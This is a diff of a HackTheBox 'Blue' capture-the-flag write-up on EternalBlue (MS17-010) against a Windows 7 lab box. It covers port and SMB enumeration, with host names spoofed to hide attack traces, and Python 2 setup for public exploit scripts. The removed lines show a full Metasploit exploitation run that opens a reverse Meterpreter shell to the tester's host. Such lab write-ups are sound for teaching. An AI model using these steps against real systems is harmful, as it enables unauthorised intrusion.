@@ -1,455 +1,444 @@
+Table o' contents:
+
+[Intro](#blue)
+
+[Internet Presence](#internet-presence)
+
+[Gateway](#gateway)
+
+[Accessible Services](#accessible-services)
+
+[Server Message Block](#server-message-block)
+
+[The Shares](#the-shares)
+
+[Disclosed System Information](#disclosed-system-information)
+
+[Vulnerable OS Version](#vulnerable-os-version)
+
+[Exploits](#exploits)
+
+[pyenv Setup](#pyenv-setup)
+
+[Running The Exploits](#running-the-exploits)
+
+
 # Blue
 **Blue** is an easy HackTheBox Windows box. Its simplicity lies in an SMBv1 service, vulnerable to the [EternalBlue](https://nordvpn.com/blog/what-is-eternalblue/) exploit. 
 
-## Enumerating ports
-Because of my impatience I typically conduct 2 scans:
-* quick scan, which gives me initial info about the ports open on the machine
-* version scan, which informs me of the versions of software on the machine
-
-### Pinging for confirmation
-After spawning the machine I pinged it first to confirm it being accessible on the network:
+## Internet Presence
+The spawned virtual machine is of ip address: "10.10.10.40".
+I will save this value as a variable to be referenced with ease later.
 
 ```bash
-(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ ping -c 5 $IP
+ip="10.10.10.40"
+```
+
+The first thing I want to know is if the target responds to ICMP Echo messages, 
+as it would confirm that the device is indeed online.
+
+```bash
+ping $ip -c 3
+```
+```
 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
-64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=113 ms
-64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=121 ms
-64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=191 ms
-64 bytes from 10.10.10.40: icmp_seq=4 ttl=127 time=176 ms
-64 bytes from 10.10.10.40: icmp_seq=5 ttl=127 time=188 ms
+64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=29.4 ms
+64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=33.7 ms
+64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=37.6 ms
 
 --- 10.10.10.40 ping statistics ---
-5 packets transmitted, 5 received, 0% packet loss, time 4002ms
-rtt min/avg/max/mdev = 112.942/157.924/191.158/33.790 ms
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 29.417/33.589/37.625/3.352 ms
 ```
 
-### Scanning
+The device is indeed online.
 
-First I fished for open ports:
+## Gateway
+Thanks to [zekosec](https://www.zekosec.com/blog/port-discover-without-nmap/)!
+
+I scan the top 1000 ports with netcat:
 
 ```bash
-(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ sudo nmap -sS -T5 -O -oN scan-quick.txt $IP
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 05:50 EST
-Nmap scan report for 10.10.10.40
-Host is up (0.11s latency).
-Not shown: 991 closed tcp ports (reset)
-PORT      STATE SERVICE
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-49152/tcp open  unknown
-49153/tcp open  unknown
-49154/tcp open  unknown
-49155/tcp open  unknown
-49156/tcp open  unknown
-49157/tcp open  unknown
-Device type: general purpose
-Running: Microsoft Windows 2008|7|Vista|8.1
-OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
-OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
-Network Distance: 2 hops
-
-OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
+nc -nvv -w 3 -z $ip 1-1000 2>&1 | grep -v "Connection refused"
+```
+```bash
+(UNKNOWN) [10.10.10.40] 445 (microsoft-ds) open
+(UNKNOWN) [10.10.10.40] 139 (netbios-ssn) open
+(UNKNOWN) [10.10.10.40] 135 (epmap) open
+ sent 0, rcvd 0
 ```
 
-
-With this initial information I did a more thorough scan:
+I also check if other, higher ports are open:
 
 ```bash
-(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ sudo nmap -sS -T5 -sV -sC -p 135,139,445,49152,49153,49154,49155,49156,49157 -oN scan-version.txt $IP
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 06:00 EST
-Nmap scan report for 10.10.10.40
-Host is up (0.20s latency).
+nc -nvv -w 3 -z $ip 1-65535 2>&1 | grep -v "Connection refused"
+```
+```bash
+(UNKNOWN) [10.10.10.40] 49157 (?) open
+(UNKNOWN) [10.10.10.40] 49156 (?) open
+(UNKNOWN) [10.10.10.40] 49155 (?) open
+(UNKNOWN) [10.10.10.40] 49154 (?) open
+(UNKNOWN) [10.10.10.40] 49153 (?) open
+(UNKNOWN) [10.10.10.40] 49152 (?) open
+...
+```
+The high, non-standard ports are probably used by internal applications.
+Therefore we really have 3 open ports:
+* 445 (SMB over TCP/IP)
+* 139 (SMB over NetBIOS)
+* 135 (Windows RPC)
 
-PORT      STATE SERVICE      VERSION
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49156/tcp open  msrpc        Microsoft Windows RPC
-49157/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+## Accessible Services
 
-Host script results:
-| smb2-security-mode:
-|   2:1:0:
-|_    Message signing enabled but not required
-|_clock-skew: mean: 4s, deviation: 2s, median: 2s
-| smb-os-discovery:
-|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
-|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
-|   Computer name: haris-PC
-|   NetBIOS computer name: HARIS-PC\x00
-|   Workgroup: WORKGROUP\x00
-|_  System time: 2025-01-31T11:01:18+00:00
-| smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-time:
-|   date: 2025-01-31T11:01:19
-|_  start_date: 2025-01-31T10:47:07
+### Server Message Block
+In order to enumerate the SMB service hosted on the machine, we can utilize the SMB client CLI-app "smbclient" from samba.
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 74.79 seconds
+SMB is a file sharing protocol, so our target should be in enumerating the shares:
+
+```bash
+smbclient --workgroup=MYWORKGROUP --user=MYUSERNAME --netbiosname=MYNETBIOSNAME --no-pass --list $ip -d 10 2> scans/smbclient/debug-share-listing.txt 
+```
+Here I explicitly define my workgroup, username and netbiosname, because samba by default fetches values from the hostname and username, which would be "kali"
+leaving blatant traces of an attack.
+I also made sure to extract as much debugging information from the conversation as possible, which will be very helpful later.
+
+#### The Shares
+Available shares:
+```bash
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+Share           Disk      
+Users           Disk
+```
+```bash
+...
+[0000] 01 00 00 00 01 00 00 00   00 00 02 00 05 00 00 00   ........ ........
+[0010] 04 00 02 00 05 00 00 00   08 00 02 00 00 00 00 80   ........ ........
+[0020] 0C 00 02 00 10 00 02 00   00 00 00 80 14 00 02 00   ........ ........
+[0030] 18 00 02 00 03 00 00 80   1C 00 02 00 20 00 02 00   ........ .... ...
+[0040] 00 00 00 00 24 00 02 00   28 00 02 00 00 00 00 00   ....$... (.......
+[0050] 2C 00 02 00 07 00 00 00   00 00 00 00 07 00 00 00   ,....... ........
+[0060] 41 00 44 00 4D 00 49 00   4E 00 24 00 00 00 00 00   A.D.M.I. N.$.....
+[0070] 0D 00 00 00 00 00 00 00   0D 00 00 00 52 00 65 00   ........ ....R.e.
+[0080] 6D 00 6F 00 74 00 65 00   20 00 41 00 64 00 6D 00   m.o.t.e.  .A.d.m.
+[0090] 69 00 6E 00 00 00 00 00   03 00 00 00 00 00 00 00   i.n..... ........
+[00A0] 03 00 00 00 43 00 24 00   00 00 00 00 0E 00 00 00   ....C.$. ........
+[00B0] 00 00 00 00 0E 00 00 00   44 00 65 00 66 00 61 00   ........ D.e.f.a.
+[00C0] 75 00 6C 00 74 00 20 00   73 00 68 00 61 00 72 00   u.l.t. . s.h.a.r.
+[00D0] 65 00 00 00 05 00 00 00   00 00 00 00 05 00 00 00   e....... ........
+[00E0] 49 00 50 00 43 00 24 00   00 00 00 00 0B 00 00 00   I.P.C.$. ........
+[00F0] 00 00 00 00 0B 00 00 00   52 00 65 00 6D 00 6F 00   ........ R.e.m.o.
+[0100] 74 00 65 00 20 00 49 00   50 00 43 00 00 00 00 00   t.e. .I. P.C.....
+[0110] 06 00 00 00 00 00 00 00   06 00 00 00 53 00 68 00   ........ ....S.h.
+[0120] 61 00 72 00 65 00 00 00   01 00 00 00 00 00 00 00   a.r.e... ........
+[0130] 01 00 00 00 00 00 00 00   06 00 00 00 00 00 00 00   ........ ........
+[0140] 06 00 00 00 55 00 73 00   65 00 72 00 73 00 00 00   ....U.s. e.r.s...
+[0150] 01 00 00 00 00 00 00 00   01 00 00 00 00 00 00 00   ........ ........
+[0160] 05 00 00 00 30 00 02 00   00 00 00 00 00 00 00 00   ....0... ........
+...
+
+        out: struct srvsvc_NetShareEnumAll
+            info_ctr                 : *
+                info_ctr: struct srvsvc_NetShareInfoCtr
+                    level                    : 0x00000001 (1)
+                    ctr                      : union srvsvc_NetShareCtr(case 1)
+                    ctr1                     : *
+                        ctr1: struct srvsvc_NetShareCtr1
+                            count                    : 0x00000005 (5)
+                            array                    : *
+                                array: ARRAY(5)
+                                    array: struct srvsvc_NetShareInfo1
+                                        name                     : *
+                                            name                     : 'ADMIN$'
+                                        type                     : STYPE_DISKTREE_HIDDEN (0x80000000)
+                                        comment                  : *
+                                            comment                  : 'Remote Admin'
+                                    array: struct srvsvc_NetShareInfo1
+                                        name                     : *
+                                            name                     : 'C$'
+                                        type                     : STYPE_DISKTREE_HIDDEN (0x80000000)
+                                        comment                  : *
+                                            comment                  : 'Default share'
+                                    array: struct srvsvc_NetShareInfo1
+                                        name                     : *
+                                            name                     : 'IPC$'
+                                        type                     : STYPE_IPC_HIDDEN (0x80000003)
+                                        comment                  : *
+                                            comment                  : 'Remote IPC'
+                                    array: struct srvsvc_NetShareInfo1
+                                        name                     : *
+                                            name                     : 'Share'
+                                        type                     : STYPE_DISKTREE (0x0)
+                                        comment                  : *
+                                            comment                  : ''
+                                    array: struct srvsvc_NetShareInfo1
+                                        name                     : *
+                                            name                     : 'Users'
+                                        type                     : STYPE_DISKTREE (0x0)
+                                        comment                  : *
+                                            comment                  : ''
+            totalentries             : *
+                totalentries             : 0x00000005 (5)
+            resume_handle            : *
+                resume_handle            : 0x00000000 (0)
+            result                   : WERR_OK
 ```
 
-[msrpc](https://superuser.com/questions/616098/what-is-rpc-and-why-is-it-so-important) - Microsoft Windows RPC, this service is largely not so important to me as it is not really used to host anything. To my mind, MS Windows RPC is a service that allows applications on the Windows machine to communicate with eachother. While RPC can also be used to send commands to the machine, which would warrant a code execution check, I had my money on the other services present.
+We can now try to connect to these shares and enumerate the data they hold. I will refrain from that for now.
 
-[netbios-ssn](https://medium.com/@chavanyashwardhan/difference-between-netbios-smb-1cd74ec02fdd) - From my understanding, it is a windows service that allows another machine to connect to the one running it. It gives every computer a NetBIOS name similar to their hostname(here HARIS-PC\x00). With NetBIOS, a computer can refer to a target computer via its NetBIOS name, which by resultion is translated into an IP address. This can also host an SMB service as _SMB over NetBIOS_.
-
-[microsoft-ds](https://en.wikipedia.org/wiki/Server_Message_Block) - this is an SMB service that allows sharing files on the network. Seeing this service on 445 means SMB can be run _over TCP/IP_ directly also.
-
-From the scans I gathered the following:
-* there is no firewall present (quick scann detected closed ports)
-* OS: Windows 7 SP 1
-* hostname:"haris-PC"
-* SMB file sharing is enabled on the system
-
-## Enumerating SMB
-I predicted the SMB server would be the most important thing to test, so I tested it first.
-
-I scanned the _SMB over TCP/IP_ for the version of SMB on the machine:
+#### Disclosed System Information
 
 ```bash
-(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ nmap -p 445 --script smb-protocols $IP
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 06:13 EST
-Nmap scan report for 10.10.10.40
-Host is up (0.19s latency).
+TargetInfo               : *
+    TargetInfo: struct AV_PAIR_LIST
+        count                    : 0x00000006 (6)
+        pair: ARRAY(6)
+            pair: struct AV_PAIR
+                AvId                     : MsvAvNbDomainName (0x2)
+                AvLen                    : 0x0010 (16)
+                Value                    : union ntlmssp_AvValue(case 0x2)
+                AvNbDomainName           : 'HARIS-PC'
+            pair: struct AV_PAIR
+                AvId                     : MsvAvNbComputerName (0x1)
+                AvLen                    : 0x0010 (16)
+                Value                    : union ntlmssp_AvValue(case 0x1)
+                AvNbComputerName         : 'HARIS-PC'
+            pair: struct AV_PAIR
+                AvId                     : MsvAvDnsDomainName (0x4)
+                AvLen                    : 0x0010 (16)
+                Value                    : union ntlmssp_AvValue(case 0x4)
+                AvDnsDomainName          : 'haris-PC'
+            pair: struct AV_PAIR
+                AvId                     : MsvAvDnsComputerName (0x3)
+                AvLen                    : 0x0010 (16)
+                Value                    : union ntlmssp_AvValue(case 0x3)
+                AvDnsComputerName        : 'haris-PC'
+            pair: struct AV_PAIR
+                AvId                     : MsvAvTimestamp (0x7)
+                AvLen                    : 0x0008 (8)
+                Value                    : union ntlmssp_AvValue(case 0x7)
+                AvTimestamp              : Tue Aug 26 01:39:00 PM 2025 EDT
+            pair: struct AV_PAIR
+                AvId                     : MsvAvEOL (0x0)
+                AvLen                    : 0x0000 (0)
+                Value                    : union ntlmssp_AvValue(case 0x0)
 
-PORT    STATE SERVICE
-445/tcp open  microsoft-ds
-
-Host script results:
-| smb-protocols:
-|   dialects:
-|     NT LM 0.12 (SMBv1) [dangerous, but default]
-|     2:0:2
-|_    2:1:0
-
-Nmap done: 1 IP address (1 host up) scanned in 4.82 seconds
+```
+```bash
+Version: struct ntlmssp_VERSION
+    ProductMajorVersion      : NTLMSSP_WINDOWS_MAJOR_VERSION_6 (0x6)
+    ProductMinorVersion      : NTLMSSP_WINDOWS_MINOR_VERSION_1 (0x1)
+    ProductBuild             : 0x1db1 (7601)
+    Reserved                 : 000000
+    NTLMRevisionCurrent      : NTLMSSP_REVISION_W2K3 (0xF)
 ```
 
-Seeing SMBv1, I immediately remebered the [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) exploit this version might be suseptible to.
-This would also line up with the OS version, as [the Microsoft Bulletin covering EternalBlue](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010) deems similar if not identical versions of windows to be vulnerable.
-I ran another nmap scan, this time check if this vulnerability is exploitable here:
+From these two pieces of debugging info we see that the network name for the device is "haris-PC".
+What is more important is the OS information - it is clear that the device is running Windows 6.1 .
+
+BONUS: The hint that this is a Windows machine was embedded inside our [ping check][##internet-presence]. Windows OS is 
+known to have the Time-To-Live packet value of 128 ( we saw 127 because of one middle device on the network).
+
+## Vulnerable OS Version
+Windows 6.1 ( more known by the name Windows 7 ) was one of the versions of Windows vulnerable to Eternal* exploits, like EternalBlue.
+I will check whether the host is actually affected, or if it is patched.
+
+### Exploits
+The best exploits to use for Eternal* exploits are available [in worawit's repo](https://github.com/worawit/MS17-010]).
+However, one massive problem with them is that they are no longer maintained to be compatible with the latest python version,
+which makes them inusable for us without some previous setup:
 
 ```bash
-(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ nmap -p 445 --script smb-vuln-ms17-010 $IP
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 06:16 EST
-Nmap scan report for 10.10.10.40
-Host is up (0.23s latency).
+python3.13 ./checker.py $ip
+```
+```bash
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Traceback (most recent call last):
+  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/./checker.py", line 55, in <module>
+    recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
+  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 262, in send_trans
+    self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
+                  ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 259, in create_trans_packet
+    return self.create_smb_packet(transCmd, mid, pid, tid)
+           ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 230, in create_smb_packet
+    return '\x00'*2 + pack('>H', len(req)) + req  # assume length is <65536
+           ~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~
+TypeError: can only concatenate str (not "bytes") to str
+```
+Python 3.x differs significantly with Python 2.x, one of those diffrences is the prohibition of joining bytes and strings directly.
 
-PORT    STATE SERVICE
-445/tcp open  microsoft-ds
+The best way to combat this is to create a separate Python virtual environment on our host and install the old python version there.
+A good and easy way to do so is through [pyenv](https://github.com/pyenv/pyenv).
 
-Host script results:
-| smb-vuln-ms17-010:
-|   VULNERABLE:
-|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
-|     State: VULNERABLE
-|     IDs:  CVE:CVE-2017-0143
-|     Risk factor: HIGH
-|       A critical remote code execution vulnerability exists in Microsoft SMBv1
-|        servers (ms17-010).
-|
-|     Disclosure date: 2017-03-14
-|     References:
-|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
-|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 
-Nmap done: 1 IP address (1 host up) scanned in 2.99 seconds
+#### pyenv Setup
+Installation:
+```bash
+curl -fsSL https://pyenv.run | bash
 ```
 
-The machine is vulnerable!
-
-## Exploiting EternalBlue via Metasploit (smh)
-Being stuck on this box for a while, I hadn't got the time nor luck finding a script exploiting this vulnerability that is easy to use. For now I opt for using Metasploit, hoping to go back someday and pwn the machine without it.
-
-With the help of [this tutorial](https://shreybs.github.io/EternalBlue/) I used Metasploit to execute EternalBlue:
-
-I first initialized Metasploit:
-
+Dependencies:
 ```bash
-(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ msfconsole
-Metasploit tip: Set the current module's RHOSTS with database values using
-hosts -R or services -R
-
-  +-------------------------------------------------------+
-  |  METASPLOIT by Rapid7                                 |
-  +---------------------------+---------------------------+
-  |      __________________   |                           |
-  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
-  |             )=\           | |  EXPLOIT   \            |
-  |            // \\          | |_____________\_______    |
-  |           //   \\         | |==[msf >]============\   |
-  |          //     \\        | |______________________\  |
-  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
-  |        //         \\      |  *********************    |
-  +---------------------------+---------------------------+
-  |      o O o                |        \'\/\/\/'/         |
-  |              o O          |         )======(          |
-  |                 o         |       .'  LOOT  '.        |
-  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
-  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
-  | |________________|__|)__| |    |     __||_)     |     |
-  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
-  |  = = = = = = = = = = = =  |     '--------------'      |
-  +---------------------------+---------------------------+
-
-
-       =[ metasploit v6.4.44-dev                          ]
-+ -- --=[ 2487 exploits - 1281 auxiliary - 431 post       ]
-+ -- --=[ 1466 payloads - 49 encoders - 13 nops           ]
-+ -- --=[ 9 evasion                                       ]
-
-Metasploit Documentation: https://docs.metasploit.com/
-
-msf6 >
+sudo apt update; sudo apt install make build-essential libssl-dev zlib1g-dev \
+libbz2-dev libreadline-dev libsqlite3-dev curl git \
+libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev
 ```
 
-I then searched for a vulnerability through the name of the aforementioned Microsoft Bulletin:
-
+Shell Configuration: 
 ```bash
-msf6 > search ms17-010
+export PYENV_ROOT="$HOME/.pyenv"
+export PATH="$PYENV_ROOT/bin:$PATH"
+eval "$(pyenv init - bash)"
+```
+(temporary, needs to be ran inside every shell to use)
 
-Matching Modules
-================
-
-   #   Name                                           Disclosure Date  Rank     Check  Description
-   -   ----                                           ---------------  ----     -----  -----------
-   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue
-SMB Remote Windows Kernel Pool Corruption
-   1     \_ target: Automatic Target                  .                .        .      .
-   2     \_ target: Windows 7                         .                .        .      .
-   3     \_ target: Windows Embedded Standard 7       .                .        .      .
-   4     \_ target: Windows Server 2008 R2            .                .        .      .
-   5     \_ target: Windows 8                         .                .        .      .
-   6     \_ target: Windows 8.1                       .                .        .      .
-   7     \_ target: Windows Server 2012               .                .        .      .
-   8     \_ target: Windows 10 Pro                    .                .        .      .
-   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
-   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
-   11    \_ target: Automatic                         .                .        .      .
-   12    \_ target: PowerShell                        .                .        .      .
-   13    \_ target: Native upload                     .                .        .      .
-   14    \_ target: MOF upload                        .                .        .      .
-   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
-   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
-   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
-   18    \_ AKA: ETERNALBLUE                          .                .        .      .
-   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
-   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
-   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
-   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
-   23    \_ AKA: ETERNALBLUE                          .                .        .      .
-   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
-   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
-   26    \_ AKA: ETERNALBLUE                          .                .        .      .
-   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
-   28    \_ target: Execute payload (x64)             .                .        .      .
-   29    \_ target: Neutralize implant                .                .        .      .
-
-
-Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
-After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
-
-msf6 > use 0
-[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+Target Python Version Install:
+```bash
+pyenv install -l
+pyenv install 2.7.18
+pyenv versions
+* system (set by /home/kali/.pyenv/version)
+  2.7.18
 ```
 
-I picked the first result.
-
-Default options:
-
+Virtual environment creation:
 ```bash
-msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
-
-Module options (exploit/windows/smb/ms17_010_eternalblue):
-
-   Name           Current Setting  Required  Description
-   ----           ---------------  --------  -----------
-   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
-                                             oit/basics/using-metasploit.html
-   RPORT          445              yes       The target port (TCP)
-   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
-                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
-target
-                                             machines.
-   SMBPass                         no        (Optional) The password for the specified username
-   SMBUser                         no        (Optional) The username to authenticate as
-   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
-                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
-                                             ines.
-   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
-                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
-
-
-Payload options (windows/x64/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Target
-
-
-
-View the full module info with the info, or info -d command.
+pyenv virtualenv 2.7.18 worawit-eternalblue
+pyenv virtualenvs 
+  2.7.18/envs/worawit-eternalblue (created from /home/kali/.pyenv/versions/2.7.18)
+  worawit-eternalblue (created from /home/kali/.pyenv/versions/2.7.18)
 ```
 
-Changing options:
-
+Environment activation:
 ```bash
-msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
-RHOSTS => 10.10.10.40
-msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.19
-LHOST => 10.10.14.19
-msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 1234
-LPORT => 1234
+pyenv activate worawit-eternalblue
+python --version
+	Python 2.7.18
+pip --version
+	pip 20.3.4 from /home/kali/.pyenv/versions/2.7.18/envs/worawit-eternalblue/lib/python2.7/site-packages/pip (python 2.7)
 ```
 
-Changed options:
-
+We now have an older version of python, which will allow us to run the scripts.
+However, aside from python itself, the scripts also utilize impacket. Impacket is absent from our virtual environment:
 ```bash
-msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
-
-Module options (exploit/windows/smb/ms17_010_eternalblue):
-
-   Name           Current Setting  Required  Description
-   ----           ---------------  --------  -----------
-   RHOSTS         10.10.10.40      yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
-                                             oit/basics/using-metasploit.html
-   RPORT          445              yes       The target port (TCP)
-   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
-                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
-target
-                                             machines.
-   SMBPass                         no        (Optional) The password for the specified username
-   SMBUser                         no        (Optional) The username to authenticate as
-   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
-                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
-                                             ines.
-   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
-                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
-
-
-Payload options (windows/x64/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.10.14.19      yes       The listen address (an interface may be specified)
-   LPORT     1234             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Target
-
-
-
-View the full module info with the info, or info -d command.
-```
-I executed the script:
-
-```bash
-msf6 exploit(windows/smb/ms17_010_eternalblue) > run
-[*] Started reverse TCP handler on 10.10.14.19:1234
-[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
-[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
-[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
-[+] 10.10.10.40:445 - The target is vulnerable.
-[*] 10.10.10.40:445 - Connecting to target for exploitation.
-[+] 10.10.10.40:445 - Connection established for exploitation.
-[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
-[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
-[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
-[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
-[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
-[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
-[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
-[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
-[*] 10.10.10.40:445 - Starting non-paged pool grooming
-[+] 10.10.10.40:445 - Sending SMBv2 buffers
-[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
-[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
-[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
-[*] 10.10.10.40:445 - Receiving response from exploit packet
-[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] 10.10.10.40:445 - Sending egg to corrupted connection.
-[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
-[*] Sending stage (203846 bytes) to 10.10.10.40
-[*] Meterpreter session 1 opened (10.10.14.19:1234 -> 10.10.10.40:49158) at 2025-01-31 07:42:10 -0500
-[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
